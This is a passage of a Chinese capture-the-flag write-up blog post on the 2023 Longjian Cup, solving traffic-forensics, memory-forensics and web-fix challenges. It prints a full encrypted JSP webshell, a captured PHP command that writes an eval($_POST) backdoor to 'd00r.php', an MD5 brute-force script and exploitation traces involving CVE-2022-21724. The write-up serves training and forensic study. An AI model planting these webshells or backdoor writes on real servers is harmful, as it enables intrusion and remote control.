style="color:#E1E4E8">);c.</span><span style="color:#B392F0">init</span><span style="color:#E1E4E8">(m</span><span style="color:#F97583">?</span><span style="color:#79B8FF">1</span><span style="color:#F97583">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">new</span><span style="color:#E1E4E8"> javax.crypto.spec.</span><span style="color:#B392F0">SecretKeySpec</span><span style="color:#E1E4E8">(xc.</span><span style="color:#B392F0">getBytes</span><span style="color:#E1E4E8">(),</span><span style="color:#9ECBFF">"AES"</span><span style="color:#E1E4E8">));</span><span style="color:#F97583">return</span><span style="color:#E1E4E8"> c.</span><span style="color:#B392F0">doFinal</span><span style="color:#E1E4E8">(s); }</span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (Exception </span><span style="color:#FFAB70">e</span><span style="color:#E1E4E8">){</span><span style="color:#F97583">return</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">; }}</span><span style="color:#F97583">%>&#x3C;%try</span><span style="color:#E1E4E8">{</span><span style="color:#F97583">byte</span><span style="color:#E1E4E8">[] data</span><span style="color:#F97583">=new</span><span style="color:#F97583"> byte</span><span style="color:#E1E4E8">[Integer.</span><span style="color:#B392F0">parseInt</span><span style="color:#E1E4E8">(request.</span><span style="color:#B392F0">getHeader</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Content-Length"</span><span style="color:#E1E4E8">))];java.io.InputStream inputStream</span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> request.</span><span style="color:#B392F0">getInputStream</span><span style="color:#E1E4E8">();</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> _num</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">;</span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> ((_num</span><span style="color:#F97583">+=</span><span style="color:#E1E4E8">inputStream.</span><span style="color:#B392F0">read</span><span style="color:#E1E4E8">(data,_num,data.length))</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">data.length);data</span><span style="color:#F97583">=</span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">(data, </span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">);</span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (session.</span><span style="color:#B392F0">getAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"payload"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">==</span><span style="color:#79B8FF">null</span><span style="color:#E1E4E8">){session.</span><span style="color:#B392F0">setAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"payload"</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">new</span><span style="color:#B392F0"> X</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">getClass</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">getClassLoader</span><span style="color:#E1E4E8">()).</span><span style="color:#B392F0">Q</span><span style="color:#E1E4E8">(data));}</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{request.</span><span style="color:#B392F0">setAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"parameters"</span><span style="color:#E1E4E8">, data);Object f</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">((Class)session.</span><span style="color:#B392F0">getAttribute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"payload"</span><span style="color:#E1E4E8">)).</span><span style="color:#B392F0">newInstance</span><span style="color:#E1E4E8">();java.io.ByteArrayOutputStream arrOut</span><span style="color:#F97583">=new</span><span style="color:#E1E4E8"> java.io.</span><span style="color:#B392F0">ByteArrayOutputStream</span><span style="color:#E1E4E8">();f.</span><span style="color:#B392F0">equals</span><span style="color:#E1E4E8">(arrOut);f.</span><span style="color:#B392F0">equals</span><span style="color:#E1E4E8">(pageContext);f.</span><span style="color:#B392F0">toString</span><span style="color:#E1E4E8">();response.</span><span style="color:#B392F0">getOutputStream</span><span style="color:#E1E4E8">().</span><span style="color:#B392F0">write</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">(arrOut.</span><span style="color:#B392F0">toByteArray</span><span style="color:#E1E4E8">(), </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">));} }</span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (Exception </span><span style="color:#FFAB70">e</span><span style="color:#E1E4E8">){}</span><span style="color:#F97583">%></span></span></code></pre>
+<p>直接写脚本爆破，最后发现直接去 cmd5 解密也行，就是收费</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> hashlib</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> itertools</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">target_hash </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "748007e861908c03"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">charset </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "0123456789abcdefghijklmnopqrstuvwxyz"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> combination </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> itertools.product(charset, </span><span style="color:#FFAB70">repeat</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#E1E4E8">    attempt </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "1"</span><span style="color:#F97583"> +</span><span style="color:#9ECBFF"> ""</span><span style="color:#E1E4E8">.join(combination) </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> "y"</span></span>
+<span class="line"><span style="color:#E1E4E8">    md5_hash </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hashlib.md5(attempt.encode()).hexdigest()[:</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> md5_hash </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> target_hash:</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"Found match! Plaintext: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">attempt</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">, MD5: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">md5_hash</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        break</span></span>
+<span class="line"><span style="color:#F97583">else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"No match found."</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D"># 14mk3y:748007e861908c03ba0830d5c47fd282</span></span></code></pre>
+<h2 id="sw">SW</h2>
+<h3 id="smallsword_1">SmallSword_1</h3>
+<blockquote>
+<p>连接蚁剑的正确密码是______________?（答案示例：123asd）</p>
+</blockquote>
+<p>随便追踪一个木马文件的 HTTP 的流（如流143），即可得到正确密码</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>6ea280898e404bfabd0ebb702327b19f</span></span></code></pre>
+<h3 id="smallsword_2">SmallSword_2</h3>
+<blockquote>
+<p>攻击者留存的值是______________?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826185917926.png" alt="image-20230826185917926"></p>
+<p>base64解码后得到</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ad6269b7-3ce2-4ae8-b97f-f259515e7a91</span></span></code></pre>
+<h3 id="smallsword_3">SmallSword_3</h3>
+<blockquote>
+<p>攻击者下载到的flag是______________?(答案示例：flag3{uuid})</p>
+</blockquote>
+<p>导出所有文件后，发现有个 PHP 文件近 5M ，十分异常，直接查看发现是一个 exe 文件，我们手动删掉 <code>->|</code> 后把后缀改为 <code>exe</code> 进行运行</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826191824143.png" alt="image-20230826191824143"></p>
+<p>运行过后得到一个高度有异常的图片，直接进行宽高爆破即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826192036647.png" alt="image-20230826192036647"></p>
+<h2 id="ew">EW</h2>
+<p>经典 HTTP 流量包，直接 <code>文件</code> -> <code>导出对象</code> -> <code>HTTP</code> 将文件全部导出</p>
+<h3 id="ez_web_1">ez_web_1</h3>
+<blockquote>
+<p>服务器自带的后门文件名是什么？（含文件后缀）</p>
+</blockquote>
+<p>一开始以为是 <code>d00r.php</code> 没成功，那么应该是通过其他文件写入的 <code>d00r.php</code> ，直接全局检索我们导出的文件，在 <code>ViewMore(1).php</code> 发现关键流量</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>a=file_put_contents('d00r.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=='));</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826175906358.png" alt="image-20230826175906358"></p>
+<p>直接得到答案</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ViewMore.php</span></span></code></pre>
+<h3 id="ez_web_2">ez_web_2</h3>
+<blockquote>
+<p>服务器的内网IP是多少？</p>
+</blockquote>
+<p>每个 <code>d00r.php</code> 都看了一下，发现 <code>d00r(7).php</code> 执行了 <code>ifconfig</code> 其响应包内容中包含了两个内网IP，经过测试得到答案</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826175926695.png" alt="image-20230826175926695"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>192.168.101.132</span></span></code></pre>
+<h3 id="ez_web_3">ez_web_3</h3>
+<blockquote>
+<p>攻击者往服务器中写入的key是什么？</p>
+</blockquote>
+<p><code>d00r(19).php</code> 发现进行了写入操作，解码后发现是一个加密的 Zip 压缩包</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826175947181.png" alt="image-20230826175947181"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>cmd=file_put_contents('k3y_f1le', base64_decode('UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA=='));</span></span></code></pre>
+<p>查看前几个文件，在 <code>d00r(16).php</code> 得到压缩包密码</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>7e03864b0db7e6f9</span></span></code></pre>
+<p>解压后文件内容为</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>7d9ddff2-2d67-4eba-9e48-b91c26c42337</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826180003979.png" alt="image-20230826180003979"></p>
+<h2 id="bf">BF</h2>
+<h3 id="baby_forensics_1">baby_forensics_1</h3>
+<blockquote>
+<p>磁盘中的key是多少？</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.\volatility.exe -f .\baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q '0x000000003df80070' -E .</span></span></code></pre>
+<p>然后 Rot 47</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826192656806.png" alt="image-20230826192656806"></p>
+<h3 id="baby_forensics_2">baby_forensics_2</h3>
+<blockquote>
+<p>电脑中正在运行的计算器的运行结果是多少？</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.\volatility.exe -f .\baby_forensics.raw --profile=Win7SP1x64 windows > dump</span></span></code></pre>
+<p>得到运行结果</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>7598632541</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826184613599.png" alt="image-20230826184613599"></p>
+<h3 id="baby_forensics_3">baby_forensics_3</h3>
+<blockquote>
+<p>该内存文件中存在的flag值是多少？</p>
+</blockquote>
+<p>010 打开 发现有串字符串 多次出现</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826184720978.png" alt="image-20230826184720978"></p>
+<p>同时发现一个类似 key 的东西 <code>qwerasdf</code></p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826184807590.png" alt="image-20230826184807590"></p>
+<p>直接 AES 解密即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826184934768.png" alt="image-20230826184934768"></p>
+<h2 id="tp">TP</h2>
+<h3 id="tcpdump_1">tcpdump_1</h3>
+<blockquote>
+<p>攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin</p>
+</blockquote>
+<p>流 <code>1323</code> 发现登录成功的回显</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>TMjpxFGQwD:123457</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826185055766.png" alt="image-20230826185055766"></p>
+<h3 id="tcpdump_2">tcpdump_2</h3>
+<blockquote>
+<p>攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）</p>
+</blockquote>
+<p>这题也没啥好说的，直接在最一开始登录成功后发现其 <code>cookie</code> 最后为 <code>userid=1</code>，而到了后面的流量包中发现 <code>userid=2</code> 了，那么直接提交后面的 <code>cookie</code> 内容</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>accesstoken=f412d3a0378d42439ee016b06ef3330c;zyplayertoken=f412d3a0378d42439ee016b06ef3330cqzw=;userid=1</span></span>
+<span class="line"><span>42ec1721ead6acc6c5eebcf86f77bcc6</span></span></code></pre>
+<h3 id="tcpdump_3">tcpdump_3</h3>
+<blockquote>
+<p>攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456</p>
+</blockquote>
+<p>在流 <code>1600</code> 发现账号密码，另外下面的 flag 不知道有什么用</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>zyplayer:1234567</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826180623911.png" alt="image-20230826180623911"></p>
+<h3 id="tcpdump_4">tcpdump_4</h3>
+<blockquote>
+<p>攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so</p>
+</blockquote>
+<p>在流 <code>1602</code> 发现关键数据，通过检索其漏洞为 <code>CVE-2022-21724</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>CVE-2022-21724:custom.dtd.xml</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826180720775.png" alt="image-20230826180720775"></p>
+<h3 id="tcpdump_5">tcpdump_5</h3>
+<blockquote>
+<p>给出攻击者获取系统权限后，下载的工具的名称，比如nmap</p>
+</blockquote>
+<p>在流 <code>1611</code>发现下载了工具</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>fscan</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826180821577.png" alt="image-20230826180821577"></p>
+<h2 id="hd">HD</h2>
+<h3 id="hacked_1">hacked_1</h3>
+<blockquote>
+<p>admIn用户的密码是什么？</p>
+</blockquote>
+<p>流 <code>56</code> 发现用户密码为加密数据</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826190531856.png" alt="image-20230826190531856"></p>
+<p>同时在流 <code>66</code> 发现 key 和 iv</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826190644152.png" alt="image-20230826190644152"></p>
+<p>直接进行 AES 解密即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>KGM7NI0/WvKswK+PlmFIhO4gqe8jJzRdOi02GQ0wZoo=</span></span>
+<span class="line"><span>key:l36DoqKUYQP0N7e1</span></span>
+<span class="line"><span>iv:131b0c8a7a6e072e</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826190506152.png" alt="image-20230826190506152"></p>
+<h3 id="hacked_2">hacked_2</h3>
+<blockquote>
+<p>app.config[‘SECRET_KEY’]值为多少？</p>
+</blockquote>
+<p>流 <code>69</code> 发现 <code>SECRET_KEY</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ssti_flask_hsfvaldb</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826190815542.png" alt="image-20230826190815542"></p>
+<h3 id="hacked_3">hacked_3</h3>
+<blockquote>
+<p>flask网站由哪个用户启动？</p>
+</blockquote>
+<p>解密 flask session 发现执行了 whoami 命令，最终得到</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>red</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826192428039.png" alt="image-20230826192428039"></p>
+<h3 id="hacked_4">hacked_4</h3>
+<blockquote>
+<p>攻击者写入的内存马的路由名叫什么？（答案里不需要加/）</p>
+</blockquote>
+<p>放眼望去，路由就那几个，随机试了一下，得到正确答案</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Index</span></span></code></pre>
+<h2 id="web">Web</h2>
+<h3 id="fungame">fungame</h3>
+<blockquote>
+<p>近日，网管小李被通知说自己管理的网站存在漏洞，请你帮助小李找到存在漏洞的位置，并且将漏洞修复（敏感信息泄露也算哦）。修复漏洞后，等待一分钟左右，/flag就会变为可读权限。可以借用 /index.php?r=debug/default/index 的web接口的debug进行分析。</p>
+</blockquote>
+<p>首先通过题干里面提到的 debug 接口查看调试的信息</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/index.php?r=debug/default/index</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826181429882.png" alt="image-20230826181429882"></p>
+<p>在这里我们发现了 check 规则</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?r=gii/default/diff&#x26;id=controller&#x26;file=deeef839799cab17ef6826cc2f5f44f7</span></span></code></pre>
+<p>既然如此我们直接去控制器里修改一下</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/var/www/html/vendor/yiisoft/yii2-gii/src/controllers</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826182054159.png" alt="image-20230826182054159"></p>
+<p>我们直接把原有的逻辑注释掉即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> actionDiff</span><span style="color:#E1E4E8">($id, $file)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D">    // $generator = $this->loadGenerator($id);</span></span>
+<span class="line"><span style="color:#6A737D">    // if ($generator->validate()) {</span></span>
+<span class="line"><span style="color:#6A737D">    //     foreach ($generator->generate() as $f) {</span></span>
+<span class="line"><span style="color:#6A737D">    //         if ($f->id === $file) {</span></span>
+<span class="line"><span style="color:#6A737D">    //             return $this->renderPartial('diff', [</span></span>
+<span class="line"><span style="color:#6A737D">    //                 'diff' => $f->diff(),</span></span>
+<span class="line"><span style="color:#6A737D">    //             ]);</span></span>
+<span class="line"><span style="color:#6A737D">    //         }</span></span>
+<span class="line"><span style="color:#6A737D">    //     }</span></span>
+<span class="line"><span style="color:#6A737D">    // }</span></span>
+<span class="line"><span style="color:#F97583">    throw</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> NotFoundHttpException</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Code file not found: </span><span style="color:#E1E4E8">$file</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>等一分钟后 check 发现 404 了，说明没问题</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826182244134.png" alt="image-20230826182244134"></p>
+<p>尝试直接 <code>cat /flag</code> 还是提示无权限，说明还是没 fix 完毕，最后看了一下题干 <code>敏感信息泄露也算哦</code> ，突然意识到 Debug 面板肯定泄露敏感信息，根据经验来看，这些信息大概率是通过 <code>phpinfo</code> 来获取的，我们直接进行搜索发现一个文件</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> find</span><span style="color:#9ECBFF"> /var/www/html</span><span style="color:#79B8FF"> -name</span><span style="color:#9ECBFF"> '*.php'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> xargs</span><span style="color:#9ECBFF"> grep</span><span style="color:#79B8FF"> -n</span><span style="color:#9ECBFF"> 'phpinfo();'</span></span>
+<span class="line"><span style="color:#B392F0">/var/www/html/vendor/yiisoft/yii2-debug/src/panels/ConfigPanel.php:72:</span><span style="color:#9ECBFF">        phpinfo</span><span style="color:#E1E4E8">();</span></span></code></pre>
+<p>直接进行 fix 即可，把返回值改为空</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> getPhpInfo</span><span style="color:#E1E4E8">()</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#79B8FF">    ob_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    phpinfo</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    $pinfo </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> ob_get_contents</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    ob_end_clean</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    $phpinfo </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> preg_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'%^.*&#x3C;body>(.*)&#x3C;/body>.*$%ms'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'$1'</span><span style="color:#E1E4E8">, $pinfo);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $phpinfo </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'&#x3C;table'</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">        '&#x3C;div class="table-responsive">&#x3C;table class="table table-condensed table-bordered table-striped table-hover config-php-info-table" '</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">        $phpinfo);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $phpinfo </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'&#x3C;/table>'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'&#x3C;/table>&#x3C;/div>'</span><span style="color:#E1E4E8">, $phpinfo);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $phpinfo </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'&#x3C;div class="center">'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'&#x3C;div class="phpinfo">'</span><span style="color:#E1E4E8">, $phpinfo);</span></span>
+<span class="line"><span style="color:#6A737D">    // return $phpinfo;</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826184858566.png" alt="image-20230826184858566"></p>   </div> <div class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/longjiancup-2023/" title="https://5ime.cn/longjiancup-2023/" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/longjiancup-2023/ </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 3.0 CN
